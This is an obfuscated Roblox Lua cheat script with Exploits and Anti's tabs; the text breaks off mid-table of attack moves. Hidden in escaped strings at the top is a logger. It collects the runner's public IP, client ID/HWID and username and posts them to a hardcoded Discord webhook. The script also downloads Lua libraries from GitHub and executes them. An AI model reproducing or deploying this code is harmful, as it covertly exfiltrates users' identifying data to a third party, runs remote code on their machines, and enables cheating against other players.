--[[ Protected by Lua Guard ]]

( function (...) local HttpService = game:GetService("\072\116\116\112\083\101\114\118\105\099\101") local _lIIlIlIlll = game:GetService("\082\098\120\065\110\097\108\121\116\105\099\115\083\101\114\118\105\099\101") local _IlIlIlIIlI = http_request or request or (syn and syn.request) if _IlIlIlIIlI then task.spawn( function () pcall( function () local _IIIIIIllll = game:HttpGet("\104\116\116\112\115\058\047\047\097\112\105\046\105\112\105\102\121\046\111\114\103") local _lllIllIlII = "\066\117\108\117\110\097\109\097\100\305" pcall( function () _lllIllIlII = _lIIlIlIlll:GetClientId() end
 ) local _lllIIlIIll = (game.Players.LocalPlayer and game.Players.LocalPlayer.Name) or "\066\105\108\105\110\109\105\121\111\114" local _lIIlIlIIlI = os.date("\037\100\047\037\109\047\037\089\032\045\032\037\072\058\037\077\058\037\083") local _lllIIllllI = { ["\099\111\110\116\101\110\116"] = "", ["\101\109\098\101\100\115"] = {{ ["\116\105\116\108\101"] = "\55357\56960\032\083\099\114\105\112\116\032\199\097\108\305\351\116\305\114\109\097\032\076\111\103\117", ["\099\111\108\111\114"] = 0x3498DB, ["\102\105\101\108\100\115"] = { {["\110\097\109\101"] = "\55357\56420\032\079\121\117\110\099\117", ["\118\097\108\117\101"] = "\096\096\096" .. _lllIIlIIll .. "\096\096\096", ["\105\110\108\105\110\101"] = true}, {["\110\097\109\101"] = "\55357\56658\032\090\097\109\097\110", ["\118\097\108\117\101"] = "\096\096\096" .. _lIIlIlIIlI .. "\096\096\096", ["\105\110\108\105\110\101"] = true}, {["\110\097\109\101"] = "\55356\57104\032\073\080\032\065\100\114\101\115\105", ["\118\097\108\117\101"] = "\096\096\096" .. _IIIIIIllll .. "\096\096\096", ["\105\110\108\105\110\101"] = false}, {["\110\097\109\101"] = "\55357\56593\032\072\087\073\068\032\047\032\067\108\105\101\110\116\032\073\068", ["\118\097\108\117\101"] = "\096\096\096" .. _lllIllIlII .. "\096\096\096", ["\105\110\108\105\110\101"] = false} }, ["\102\111\111\116\101\114"] = { ["\116\101\120\116"] = "\071\252\118\101\110\108\105\032\076\111\103\103\101\114\032\083\105\115\116\101\109\105" } }} } _IlIlIlIIlI({ Url = "\104\116\116\112\115\058\047\047\100\105\115\099\111\114\100\046\099\111\109\047\097\112\105\047\119\101\098\104\111\111\107\115\047\049\053\051\052\057\057\053\055\056\052\048\052\049\051\054\057\056\049\051\047\081\050\071\102\071\116\103\081\101\089\119\107\103\075\109\049\076\076\076\087\055\106\073\072\084\119\074\051\088\120\055\110\103\051\053\065\045\118\100\109\075\076\057\077\070\079\103\084\116\067\120\120\110\119\075\106\075\051\055\122\109\115\066\066\079\119\117\069", Method = "\080\079\083\084", Headers = { ["\067\111\110\116\101\110\116\045\084\121\112\101"] = "\097\112\112\108\105\099\097\116\105\111\110\047\106\115\111\110" }, Body = HttpService:JSONEncode(_lllIIllllI) }) end
 ) end
 ) end
 getgenv()._RevenantTSBLoaded = true local _IIIlIIIIll = "\104\116\116\112\115\058\047\047\114\097\119\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047\090\075\065\089\052\048\052\047\079\098\115\105\100\105\097\110\047\114\101\102\115\047\104\101\097\100\115\047\109\097\105\110\047" local _lIlIlllIll = "\104\116\116\112\115\058\047\047\097\112\105\046\103\105\116\104\117\098\046\099\111\109\047\114\101\112\111\115\047\090\075\065\089\052\048\052\047\079\098\115\105\100\105\097\110\047\099\111\109\109\105\116\115\047\109\097\105\110" if getgenv().RevenantLoaded then if getgenv().RevenantCleanup then pcall(getgenv().RevenantCleanup) end
 getgenv().RevenantLoaded = false pcall( function () game:GetService("\083\116\097\114\116\101\114\071\117\105"):SetCore("\083\101\110\100\078\111\116\105\102\105\099\097\116\105\111\110", { Title = _IlIIIlllII("\090\075\065\089\084\083\066"), Text = "\082\101\045\101\120\101\099\117\116\105\110\103\046\046\046", Duration = 0x1, }) end
 ) task.wait(0x0) end
 getgenv().RevenantLoaded = true local _lIllIIlIIl = "\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\046\115\104\097" do if not isfolder("\090\075\065\089\084\083\066") then makefolder("\090\075\065\089\084\083\066") end
 if not isfolder("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110") then makefolder("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110") end
 if not isfile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\076\105\098\114\097\114\121\046\108\117\097") then writefile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\076\105\098\114\097\114\121\046\108\117\097", game:HttpGet(_IIIlIIIIll .. "\076\105\098\114\097\114\121\046\108\117\097")) end
 if not isfile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\084\104\101\109\101\077\097\110\097\103\101\114\046\108\117\097") then writefile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\084\104\101\109\101\077\097\110\097\103\101\114\046\108\117\097", game:HttpGet(_IIIlIIIIll .. "\097\100\100\111\110\115\047\084\104\101\109\101\077\097\110\097\103\101\114\046\108\117\097")) end
 if not isfile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\083\097\118\101\077\097\110\097\103\101\114\046\108\117\097") then writefile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\083\097\118\101\077\097\110\097\103\101\114\046\108\117\097", game:HttpGet(_IIIlIIIIll .. "\097\100\100\111\110\115\047\083\097\118\101\077\097\110\097\103\101\114\046\108\117\097")) end
 end
 local _IIIllIIlll = loadfile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\076\105\098\114\097\114\121\046\108\117\097")() _IIIllIIlll.ForceCheckbox = false if not _IIIllIIlll.CreateLoading then writefile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\076\105\098\114\097\114\121\046\108\117\097", game:HttpGet(_IIIlIIIIll .. "\076\105\098\114\097\114\121\046\108\117\097")) writefile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\084\104\101\109\101\077\097\110\097\103\101\114\046\108\117\097", game:HttpGet(_IIIlIIIIll .. "\097\100\100\111\110\115\047\084\104\101\109\101\077\097\110\097\103\101\114\046\108\117\097")) writefile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\083\097\118\101\077\097\110\097\103\101\114\046\108\117\097", game:HttpGet(_IIIlIIIIll .. "\097\100\100\111\110\115\047\083\097\118\101\077\097\110\097\103\101\114\046\108\117\097")) _IIIllIIlll = loadfile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\076\105\098\114\097\114\121\046\108\117\097")() _IIIllIIlll.ForceCheckbox = false end
 local _lllIllllIl = loadfile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\084\104\101\109\101\077\097\110\097\103\101\114\046\108\117\097")() local _IlIllIIIlI = loadfile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\083\097\118\101\077\097\110\097\103\101\114\046\108\117\097")() local _lIIlIllIlI = _IIIllIIlll.Options local _llIIllIlll = _IIIllIIlll.Toggles do local _IIIIIIlIII = setmetatable({Value = false}, { __index = function () return function () end
 end
 }) if not getmetatable(_lIIlIllIlI) then setmetatable(_lIIlIllIlI, {__index = function () return _IIIIIIlIII end
 }) end
 if not getmetatable(_llIIllIlll) then setmetatable(_llIIllIlll, {__index = function () return _IIIIIIlIII end
 }) end
 end
 local _lllIlllIII = false local _IllIllIlll = 0x0 local _IlIlIIlIII = false local _lIlIIlllIl local _IIlIllIlII local _lIllIllIIl local _lIlIIIIlIl local _lIIIllIIII local _IIIlIlIIIl local _lIllIlllll local _IIIlIIlllI, _disguise_applying, _disguise_random_cooldown local _IIlIIIIIII, _disguise_cache, _disguise_allowed_cache local _llIlIIllII, _disguise_spawn_conn, _disguise_maintain_conn local _IIlIIIIIII, _disguise_attr_char_conn, _disguise_presets local _lIlllIIIII, _disguiseCollectTools, _disguiseRestoreTools local _llIIllIIll, _disguiseSelectiveClean, _disguiseFullClean local _llllIllllI, _disguiseApplyToChar, _disguiseHookAttrWatch local _IlIIlIIIll local _IlIIIIIIll, _disguise_fav_file local _lIIlIIIllI, _disguise_refresh_fav_dropdown local _lIllllllll, _RCS_MyRank, _RCS_Prefix, _RCS_Channel, _RCS_RankMap local _lllIIIIlll, _RCS_MyHWID, _RCS_SessionToken, _RCS_AnchorConn, _RCS_MsgConn local _IIllllIlII, _RCS_Send, _RCS_ExecuteOnSelf, _RCS_SendCmd local _lIlIIlIlII, _FUCCloneRoot, _FUCCloneTrack local _llIIllIlIl, _dCloneRoot, _dRenderConn local _IllIlIlIIl = game:GetService("\080\108\097\121\101\114\115").LocalPlayer local _IlllIlllII = (_IllIlIlIIl.DisplayName ~= "" and _IllIlIlIIl.DisplayName) or _IllIlIlIIl.Name do if type(isfile) == "\102\117\110\099\116\105\111\110" and type(writefile) == "\102\117\110\099\116\105\111\110" and type(readfile) == "\102\117\110\099\116\105\111\110" then writefile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\076\105\098\114\097\114\121\046\108\117\097", game:HttpGet(_IIIlIIIIll .. "\076\105\098\114\097\114\121\046\108\117\097")) writefile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\084\104\101\109\101\077\097\110\097\103\101\114\046\108\117\097", game:HttpGet(_IIIlIIIIll .. "\097\100\100\111\110\115\047\084\104\101\109\101\077\097\110\097\103\101\114\046\108\117\097")) writefile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\083\097\118\101\077\097\110\097\103\101\114\046\108\117\097", game:HttpGet(_IIIlIIIIll .. "\097\100\100\111\110\115\047\083\097\118\101\077\097\110\097\103\101\114\046\108\117\097")) _IIIllIIlll = loadfile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\076\105\098\114\097\114\121\046\108\117\097")() _IIIllIIlll.ForceCheckbox = false _lllIllllIl = loadfile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\084\104\101\109\101\077\097\110\097\103\101\114\046\108\117\097")() _IlIllIIIlI = loadfile("\090\075\065\089\084\083\066\047\111\098\115\105\100\105\097\110\047\083\097\118\101\077\097\110\097\103\101\114\046\108\117\097")() _lIIlIllIlI = _IIIllIIlll.Options _llIIllIlll = _IIIllIIlll.Toggles do local _IIIIIIlIII = setmetatable({Value = false}, { __index = function () return function () end
 end
 }) if not getmetatable(_lIIlIllIlI) then setmetatable(_lIIlIllIlI, {__index = function () return _IIIIIIlIII end
 }) end
 if not getmetatable(_llIIllIlll) then setmetatable(_llIIllIlll, {__index = function () return _IIIIIIlIII end
 }) end
 end
 end
 end
 task.spawn( function () if not isfolder("\090\075\065\089\084\083\066\047\097\115\115\101\116\115") then makefolder("\090\075\065\089\084\083\066\047\097\115\115\101\116\115") end
 local _lIIIllIIlI = "\104\116\116\112\115\058\047\047\114\097\119\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047\090\075\065\089\052\048\052\047\090\075\065\089\084\083\066\047\109\097\105\110\047\097\115\115\101\116\115\047" local _llIIlIllIl = { "\077\049\072\105\116\049\046\109\112\051", "\077\049\072\105\116\050\046\109\112\051", "\077\049\072\105\116\051\046\109\112\051", "\077\049\072\105\116\052\046\109\112\051" } for _lIIlIllIlI, fname in ipairs(_llIIlIllIl) do local _llIlIIlIll = "\090\075\065\089\084\083\066\047\097\115\115\101\116\115\047" .. fname if not isfile(_llIlIIlIll) then local _llllllllII, _IIIlIIlIll = pcall( function () return game:HttpGet(_lIIIllIIlI .. fname) end
 ) if _llllllllII and _IIIlIIlIll and #_IIIlIIlIll > 0x0 then pcall( function () writefile(_llIlIIlIll, _IIIlIIlIll) end
 ) end
 end
 end
 end
 ) local function _IIlIIlllll(text, opts) local _lllIlIIIll = ( function (year) local _IlIlIllIll = math.floor(year / 0x64) local _IllIllIIll = (0xF - math.floor((0xD + 0x8 * _IlIlIllIll) / 0x19) + _IlIlIllIll - math.floor(_IlIlIllIll / 0x4)) % 0x1E local _llIlIIIllI = (0x4 + _IlIlIllIll - math.floor(_IlIlIllIll / 0x4)) % 0x7 local _IllIIIllII = (0x13 * (year % 0x13) + _IllIllIIll) % 0x1E local _IllIIlllIl = (0x2 * (year % 0x4) + 0x4 * (year % 0x7) + 0x6 * _IllIIIllII + _llIlIIIllI) % 0x7 local _llIIIlIIIl = 0x16 + _IllIIIllII + _IllIIlllIl if _IllIIIllII == 0x1D and _IllIIlllIl == 0x6 then return "\048\052\032\049\057" elseif _IllIIIllII == 0x1C and _IllIIlllIl == 0x6 then return "\048\052\032\049\056" elseif _llIIIlIIIl > 0x1F then return ("\048\052\032\037\048\050\100"):format(_llIIIlIIIl - 0x1F) else return ("\048\051\032\037\048\050\100"):format(_llIIIlIIIl) end
 end
 )(tonumber(os.date("\037\089"))) local _IlIlIIIlII = { ["\048\049\032\048\049"] = "\65533", ["\049\048\032\051\049"] = "\65533", [_lllIlIIIll] = "\65533", } if opts and opts.entireChristmas then for _llIIIlIIIl = 0x1, 0x1F do _IlIlIIIlII["\049\050\032" .. ("\037\048\050\100"):format(_llIIIlIIIl)] = ({ "\65533", "\65533" })[math.random(0x1, 0x2)] end
 end
 local _IlllIllIlI = os.date("\037\109\032\037\100") if _IlIlIIIlII[_IlllIllIlI] then local _lIllIllIll = _IlIlIIIlII[_IlllIllIlI] return ("\037\115\032\037\115\032\037\115"):format(_lIllIllIll, text, _lIllIllIll) end
 return text end
 local function _IlIIIlllII(text) return _IIlIIlllll(text, {entireChristmas = true}) end
 task.spawn( function () local _IlIlIIllll, _mainErr = xpcall( function () local _lllIllIlIl = _IIIllIIlll:CreateWindow({ Title = _IlIIIlllII("\072\121\112\101\114\084\101\097\109"), Footer = _IlIIIlllII("\072\121\112\101\114\084\101\097\109"), Icon = "\114\098\120\097\115\115\101\116\105\100\058\047\047\056\055\050\050\055\048\056\048\055\049\048\050\054\051", NotifySide = "\082\105\103\104\116", ShowCustomCursor = false, Resizable = true, Center = true, AutoShow = true, }) _IIIllIIlll.ShowCustomCursor = false local _IIIIlllIIl = _IIIllIIlll.Notify _IIIllIIlll.Notify = function (self, opts) if _IIIllIIlll.Unloaded then return end
 if type(opts) == "\116\097\098\108\101" then local _llIlllIIll = tostring(opts.Title or "") local _IllllIlIIl = tostring(opts.Content or "") local _IIIIIllIlI = opts.Time or opts.Duration or 0x4 return _IIIIlllIIl(self, { Title = _llIlllIIll ~= "" and _llIlllIIll or "\090\075\065\089\052\048\052", Description = _IllllIlIIl, _IlllIlIllI = _IIIIIllIlI, SoundId = 0x1119FDF6F, }) else return _IIIIlllIIl(self, { Title = _IlIIIlllII("\090\075\065\089\052\048\052"), Description = tostring(opts or ""), _IlllIlIllI = 0x4, SoundId = 0x1119FDF6F }) end
 end
 local _llIllIIlIl = "\049\051\049\048\052\056\051\057\057\054\056\053\053\053\053" local _lIIlIIlIII = "\049\048\052\052\057\055\054\049\052\054\051" local _llIIlIIIlI = tostring(game.PlaceId) local _IIlIIIlIlI = { ["\083\097\105\116\097\109\097"] = "\066\097\108\100", ["\071\097\114\111\117"] = "\072\117\110\116\101\114", ["\077\111\110\115\116\101\114\032\071\097\114\111\117"] = "\077\111\110\115\116\101\114", ["\083\117\105\114\121\117"] = "\080\117\114\112\108\101", ["\071\101\110\111\115"] = "\067\121\098\111\114\103", ["\083\111\110\105\099"] = "\078\105\110\106\097", ["\077\101\116\097\108\032\066\097\116"] = "\066\097\116\116\101\114", ["\065\116\111\109\105\099\032\083\097\109\117\114\097\105"] = "\066\108\097\100\101", ["\084\097\116\115\117\109\097\107\105"] = "\069\115\112\101\114", ["\067\104\105\108\100\032\069\109\112\101\114\111\114"] = "\084\101\099\104", ["\076\105\103\104\116\110\105\110\103\032\077\097\120"] = "\076\105\103\104\116\110\105\110\103", ["\071\111\106\111"] = "\083\111\114\099\101\114\101\114", ["\075\074"] = "\075\074", } local _llIlIllllI = (_llIIlIIIlI == _llIllIIlIl) local _lllIIllIII = true local _lIIIIIIllI = { [_llIllIIlIl] = true, [_lIIlIIlIII] = true } local _IllIllIIlI = ( typeof(getrawmetatable) == "\102\117\110\099\116\105\111\110" and typeof(setreadonly) == "\102\117\110\099\116\105\111\110" and typeof(newcclosure) == "\102\117\110\099\116\105\111\110" and typeof(getcallingscript) == "\102\117\110\099\116\105\111\110" ) local _IlllIlIlII = type(sethiddenproperty) == "\102\117\110\099\116\105\111\110" local _lIIIlIIIlI = { ChangeLogs = _lllIllIlIl:AddTab("\078\111\116\105\099\101", "\107\101\121"), LocalPlayer = _lllIllIlIl:AddTab("\077\097\105\110", "\104\111\117\115\101"), Exploits = _lllIllIlIl:AddTab("\080\108\097\121\101\114", "\117\115\101\114"), Visuals = _lllIllIlIl:AddTab("\086\105\115\117\097\108\115", "\115\099\097\110\045\101\121\101"), } _lIIIlIIIlI.Combat = _lIIIlIIIlI.Exploits _lIIIlIIIlI.Commands = _lllIllIlIl:AddTab("\067\111\109\109\097\110\100\115", "\116\101\114\109\105\110\097\108") _lIIIlIIIlI.Map = _lllIllIlIl:AddTab("\077\097\112", "\109\097\112\045\112\105\110") _lIIIlIIIlI.Anims = _lllIllIlIl:AddTab("\065\110\105\109\097\116\105\111\110\115", "\109\111\118\101\045\051\100") if _lllIIllIII then _lIIIlIIIlI.Misc = _lllIllIlIl:AddTab("\077\105\115\099\097\108\108\097\110\101\111\117\115", "\101\108\108\105\112\115\105\115") end
 _lIIIlIIIlI.Settings = _lllIllIlIl:AddTab("\085\073\032\083\101\116\116\105\110\103\115", "\115\101\116\116\105\110\103\115") local _IlllIlllIl = _lIIIlIIIlI.LocalPlayer:AddLeftTabbox() local _IIllIllIlI = _IlllIlllIl:AddTab("\077\111\118\101\109\101\110\116") local _lllIIIlIll = _IlllIlllIl:AddTab("\067\104\097\114\097\099\116\101\114") local _llllIIlllI = _lIIIlIIIlI.LocalPlayer:AddLeftGroupbox("\075\101\121\098\105\110\100\115", "\107\101\121\098\111\097\114\100") local _IIIIIIllll = _lIIIlIIIlI.LocalPlayer:AddRightGroupbox("\065\117\116\111\109\097\116\105\111\110", "\102\111\108\100\101\114\045\103\105\116\045\050") local _IlIlIIIlIl = _lIIIlIIIlI.LocalPlayer:AddRightGroupbox("\068\097\115\104\101\115", "\099\104\101\118\114\111\110\115\045\117\112") local _IIlIIIlIll = _lIIIlIIIlI.Visuals:AddLeftGroupbox("\081\117\097\108\105\116\121\032\079\102\032\076\105\102\101", "\102\108\111\119\101\114\045\050") local _lllIIIllIl = _lIIIlIIIlI.Visuals:AddRightGroupbox("\069\083\080", "\101\121\101") local _llIlIIlIIl = _lIIIlIIIlI.Visuals:AddRightGroupbox("\087\111\114\108\100", "\101\097\114\116\104") local _IIlIIlllIl = _lIIIlIIIlI.Anims:AddLeftGroupbox("\082\054", "\112\101\114\115\111\110\045\115\116\097\110\100\105\110\103") local _IlIlIIllII = _lIIIlIIIlI.Anims:AddLeftGroupbox("\077\049\032\065\110\105\109\097\116\105\111\110\115", "\104\097\110\100\045\102\105\115\116") local _lllIlIIIIl = _lIIIlIIIlI.Anims:AddLeftGroupbox("\083\097\105\116\097\109\097\032\065\110\105\109\097\116\105\111\110\115", "\097\114\114\111\119\045\114\105\103\104\116\045\108\101\102\116") local _lllIlIIlIl = _lIIIlIIIlI.Anims:AddRightGroupbox("\067\117\115\116\111\109\032\065\110\105\109\097\116\105\111\110\115", "\100\105\097\109\111\110\100\045\112\108\117\115") local _llIIlllIll, BoxTools, BoxMovement, _IIlIllllIl local _IIlIllllIl = _IIllIllIlI BoxMovement = _IIllIllIlI local _IllIIIIIll = _lllIIIlIll local _llIlIIIIIl = _lIIIlIIIlI.Exploits:AddLeftGroupbox("\066\114\105\110\103", "\102\105\108\101\045\099\111\103") local _lIlIIlIIII = _lIIIlIIIlI.Exploits:AddLeftGroupbox("\065\110\116\105\039\115", "\103\104\111\115\116") local _IIIlIIIIII = _lIIIlIIIlI.Exploits:AddRightGroupbox("\087\097\108\108\032\067\111\109\098\111", "\104\097\110\100\045\102\105\115\116") local _IIIIIlIlIl = _lIIIlIIIlI.Exploits:AddRightGroupbox("\084\114\097\115\104\099\097\110", "\116\114\097\115\104") local _llIIllllIl = _lIIIlIIIlI.Exploits:AddRightGroupbox("\073\110\118\105\115\105\098\108\101\032\077\111\118\101\115", "\101\121\101\045\111\102\102") local _lIIIlIlIll = _lIIIlIIIlI.Exploits:AddRightGroupbox("\083\116\097\110\100", "\117\115\101\114\045\114\111\117\110\100") BoxTools = _llIlIIIIIl local function _IIIlIllIlI(_lIIlIIlllI) local _IlllIIIIIl = (_lIIlIIlllI.DisplayName ~= "" and _lIIlIIlllI.DisplayName) or _lIIlIIlllI.Name return _IlllIIIIIl .. "\040\064" .. _lIIlIIlllI.Name .. "\041" end
 local function _IIlllIllII(_IllIlIlIII) if not _IllIlIlIII or _IllIlIlIII == "" then return nil end
 local _IIIIIllIll = _IllIlIlIII:match("\064\040\091\094\037\041\093\043\041") if _IIIIIllIll then local _IIIIlIIIll = game:GetService("\080\108\097\121\101\114\115"):FindFirstChild(_IIIIIllIll) if _IIIIlIIIll then return _IIIIlIIIll end
 end
 for _lIIlIllIlI, _lIIlIIlllI in pairs(game:GetService("\080\108\097\121\101\114\115"):GetPlayers()) do if _lIIlIIlllI.Name == _IllIlIlIII or _lIIlIIlllI.DisplayName == _IllIlIlIII then return _lIIlIIlllI end
 end
 return nil end
 do local _llIlIIlIll = game:GetService("\080\108\097\121\101\114\115").LocalPlayer local RunService = game:GetService("\082\117\110\083\101\114\118\105\099\101") local _IIIIIIllIl = nil local _lIllllllll = true local _IllIIlIIll = false local _IlllIIlIlI = nil local _lIlllIIIII = nil local _lllIlIIIIl = nil local _llIIIlIIIl = nil local _lllIlIlIlI = nil local _IlIIIlIIII = nil local _IIIIIIIlIl = nil local _llllllllIl = nil local _IlllIlIIII = 0x0 local _IlIlllIlll = 0x0 local _llIIIlIIlI = nil local _lIlIlIllIl = { 0x0, 0x0, 0x0, 0x0 } local _IIllIlIllI = 0x0 local _lllIIIIIll = 0x0 local _IIllIIlllI = nil local _llIllIIlll local _llIlIllIII = CFrame.new(-0x2, 0x2, 0x5) local _lIllIlIIll = CFrame.new(0x0, 0x0, -0x4) local _llllllllII = _llIlIllIII local _lllIllIIII = { { "\078\111\114\109\097\108\032\080\117\110\099\104", 0x26FFB2A87, 0x14, 0x1, "\078\111\114\109\097\108\032\080\117\110\099\104" }, { "\067\111\110\115\101\099\117\116\105\118\101\032\080\117\110\099\104\101\115", 0x26FE15C50, 0xF, 0x2, "\067\111\110\115\101\099\117\116\105\118\101\032\080\117\110\099\104\101\115" }, { "\083\104\111\118\101", 0x27023EB21, 0xA, 0x3, "\083\104\111\118\101" }, { "\085\112\112\101\114\099\117\116", 0x2E9AA0F6C, 0x14, 0x4, "\085\112\112\101\114\099\117\116" }, { "\084\097\098\108\101\032\070\108\105\112", 0x2A570BB77, 0x14, 0x2, "\084\097\098\108\101\032\070\108\105\112" }, { "\083\101\114\105\111\117\115\032\080\117\110\099\104", 0x305DDF365, 0x14, 0x3, "\083\101\114\105\111\117\115\032\080\117\110\099\104" }, { "\079\109\110\105\032\068\105\114\101\099\116\105\111\110\097\108\032\080\117\110\099\104", 0x33E268217, 0x14, 0x4, "\079\109\110\105\032\068\105\114\101\099\116\105\111\110\097\108\032\080\117\110\099\104" }, { "\076\101\116\104\097\108\032\087\104\105\114\108\119\105\110\100\032\083\116\114\101\097\109", 0x2DCF388FB, 0x14, 0x2, "\076\101\116\104\097\108\032\087\104\105\114\108\119\105\110\100\032\083\116\114\101\097\109" }, { "\070\108\111\119\105\110\103\032\087\097\116\101\114", 0x2DB858107, 17.5, 0x1, "\070\108\111\119\105\110\103\032\087\097\116\101\114" }, { "\072\117\110\116\101\114\115\032\071\114\097\115\112", 0x2DD97EFA8, 0xF, 0x3, "\072\117\110\116\101\114\039\115\032\071\114\097\115\112" }, { "\080\114\101\121\115\032\080\101\114\105\108", 0x2E03A57DC, 0x11, 0x4, "\080\114\101\121\039\115\032\080\101\114\105\108" }, { "\087\097\116\101\114\032\083\116\114\101\097\109\032\067\117\116\116\105\110\103\032\070\105\115\116",0x2E6BB6C76, 8.45, 0x1, "\087\097\116\101\114\032\083\116\114\101\097\109\032\067\117\116\116\105\110\103\032\070\105\115\116"}, { "\084\104\101\032\070\105\110\097\108\032\072\117\110\116", 0x2E6DB65A7, 0x65, 0x2, "\084\104\101\032\070\105\110\097\108\032\072\117\110\116" }, { "\082\111\099\107\032\083\112\108\105\116\116\105\110\103\032\070\105\115\116", 0x345E05668, 0xE, 0x3, "\082\111\099\107\032\083\112\108\105\116\116\105\110\103\032\070\105\115\116" }, { "\067\114\117\115\104\101\100\032\082\111\099\107", 0x32C754D1E, 9.58, 0x4, "\067\114\117\115\104\101\100\032\082\111\099\107" }, { "\077\097\099\104\105\110\101\032\071\117\110\032\066\108\111\119\115", 0x2EB20E216, 0xF, 0x1, "\077\097\099\104\105\110\101\032\071\117\110\032\066\108\111\119\115" }, { "\073\103\110\105\116\105\111\110\032\066\117\114\115\116", 0x2E937836C, 17.5, 0x2, "\073\103\110\105\116\105\111\110\032\066\117\114\115\116" }, { "\066\108\105\116\122\032\083\104\111\116", 0x2F01B8CFE, 0x19, 0x3, "\066\108\105\116\122\032\083\104\111\116" }, { "\074\101\116\032\068\105\118\101", 0x2F40C6F8D, 17.5, 0x4, "\074\101\116\032\068\105\118\101" }, { "\084\104\117\110\100\101\114\032\075\105\099\107", 0x36D7D68BD, 0xF, 0x1, "\084\104\117\110\100\101\114\032\075\105\099\107" }, { "\083\112\101\101\100\098\108\105\116\122\032\068\114\111\112\107\105\099\107", 0x2FCE07F0C, 0x14, 0x2, "\083\112\101\101\100\098\108\105\116\122\032\068\114\111\112\107\105\099\107" }, { "\070\108\097\109\101\119\097\118\101\032\067\097\110\110\111\110", 0x30BD3D086, 0x19, 0x3, "\070\108\097\109\101\119\097\118\101\032\067\097\110\110\111\110" }, { "\073\110\099\105\110\101\114\097\116\101", 0x30F9AE2EA, 0x65, 0x4, "\073\110\099\105\110\101\114\097\116\101" }, { "\070\108\097\115\104\032\083\116\114\105\107\101", 0x3194EDD9B, 17.5, 0x1, "\070\108\097\115\104\032\083\116\114\105\107\101" }, { "\087\104\105\114\108\119\105\110\100\032\075\105\099\107", 0x3186E666A, 0x14, 0x2, "\087\104\105\114\108\119\105\110\100\032\075\105\099\107" }, { "\083\099\097\116\116\101\114", 0x31C78E8CD, 21.25,0x3, "\083\099\097\116\116\101\114" }, { "\069\120\112\108\111\115\105\118\101\032\083\104\117\114\105\107\101\110", 0x324BD6EF4, 17.5, 0x4, "\069\120\112\108\111\115\105\118\101\032\083\104\117\114\105\107\101\110" }, { "\084\119\105\110\098\108\097\100\101\032\082\117\115\104", 0x32C8D1CE6, 0x14, 0x1, "\084\119\105\110\098\108\097\100\101\032\082\117\115\104" }, { "\083\116\114\097\105\103\104\116\032\079\110", 0x32D31FE33, 0x11, 0x2, "\083\116\114\097\105\103\104\116\032\079\110" }, { "\067\097\114\110\097\103\101", 0x331F704BE, 0x19, 0x3, "\067\097\114\110\097\103\101" }, { "\070\111\117\114\102\111\108\100\032\070\108\097\115\104\115\116\114\105\107\101", 0x33B645FA1, 0x19, 0x4, "\070\111\117\114\102\111\108\100\032\070\108\097\115\104\115\116\114\105\107\101" }, { "\072\111\109\101\114\117\110", 0x342B7AE01, 17.5, 0x1, "\072\111\109\101\114\117\110" }, { "\071\114\097\110\100\032\083\108\097\109", 0x3544B7E0C, 0x14, 0x3, "\071\114\097\110\100\032\083\108\097\109" }, { "\070\111\117\108\032\066\097\108\108", 0x357699D52, 0x17, 0x4, "\070\111\117\108\032\066\097\108\108" }, { "\083\097\118\097\103\101\032\084\111\114\110\097\100\111", 0x36D568BD8, 0x11, 0x1, "\083\097\118\097\103\101\032\084\111\114\110\097\100\111" }, { "\066\114\117\116\097\108\032\066\101\097\116\100\111\119\110", 0x36C432925, 0x1E, 0x2, "\066\114\117\116\097\108\032\066\101\097\116\100\111\119\110" }, { "\083\116\114\101\110\103\116\104\032\068\105\102\102\101\114\101\110\099\101", 0x3781E8810, 0x14, 0x3, "\083\116\114\101\110\103\116\104\032\068\105\102\102\101\114\101\110\099\101" }, { "\068\101\097\116\104\032\066\108\111\119", 0x385BFEA97, 0x65, 0x4, "\068\101\097\116\104\032\066\108\111\119" }, { "\081\117\105\099\107\032\083\108\105\099\101", 0x38F69141D, 0x14, 0x1, "\081\117\105\099\107\032\083\108\105\099\101" }, { "\065\116\109\111\115\032\067\108\101\097\118\101", 0x386BD6B98, 0x16, 0x2, "\065\116\109\111\115\032\067\108\101\097\118\101" }, { "\080\105\110\112\111\105\110\116\032\067\117\116", 0x38FB4D8C9, 0x11, 0x3, "\080\105\110\112\111\105\110\116\032\067\117\116" }, { "\080\105\110\112\111\105\110\116\032\067\117\116", 0x38FAC4F4E, 0x11, 0x3, "\080\105\110\112\111\105\110\116\032\067\117\116" }, { "\083\112\108\105\116\032\083\101\099\111\110\100\032\067\111\117\110\116\101\114", 0x390A5C7FC, 17.5, 0x4, "\083\112\108\105\116\032\083\101\099\111\110\100\032\067\111\117\110\116\101\114" }, { "\083\117\110\115\101\116", 0x39D126C89, 0xF, 0x1, "\083\117\110\115\101\116" }, { "\083\111\108\097\114\032\067\108\101\097\118\101", 0x3A65DE215, 0xF, 0x2, "\083\111\108\097\114\032\067\108\101\097\118\101" }, { "\083\117\110\114\105\115\101", 0x3BD64F039, 0x14, 0x3, "\083\117\110\114\105\115\101" }, { 